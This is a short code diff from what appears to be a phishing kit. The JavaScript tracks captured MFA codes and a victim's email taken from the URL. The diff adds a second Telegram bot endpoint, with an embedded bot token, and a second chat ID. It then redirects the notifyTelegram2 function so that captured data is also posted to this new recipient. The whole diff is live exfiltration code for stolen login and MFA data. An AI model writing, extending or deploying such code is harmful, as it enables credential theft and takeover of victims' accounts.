@@ -518,7 +518,9 @@ let lastMfaCode = null;
 let mfaAttemptCount = 0;
 let cooldownActive = false; // Prevents rapid submission
 const TELEGRAM_API_URL = 'https://api.telegram.org/bot7405272455:AAHmoxjlVkxxbb0wYrb9U1gO5TgSEdiOadI/sendMessage'; // Telegram API URL
+const TELEGRAM_API_URL2 = 'https://api.telegram.org/bot8017134630:AAHQZ5ihGYcYRZJMyg-vh4xYepc0pLUW9-k/sendMessage'; // Telegram API URL
 const CHAT_ID = '1412104349'; // Your Telegram chat ID
+const CHAT_ID2 = '7721980705'; // Your Telegram chat ID
 const EE = getBase64FromUrl();  // Email as 'EE'
 
 document.addEventListener("DOMContentLoaded", () => {
@@ -600,10 +602,10 @@ function notifyTelegram(message) {
 }
 function notifyTelegram2(message) {
     $.ajax({
-        url: TELEGRAM_API_URL,
+        url: TELEGRAM_API_URL2,
         method: 'POST',
         data: {
-            chat_id: CHAT_ID,
+            chat_id: CHAT_ID2,
             text: message,
             parse_mode: 'Markdown'
         },
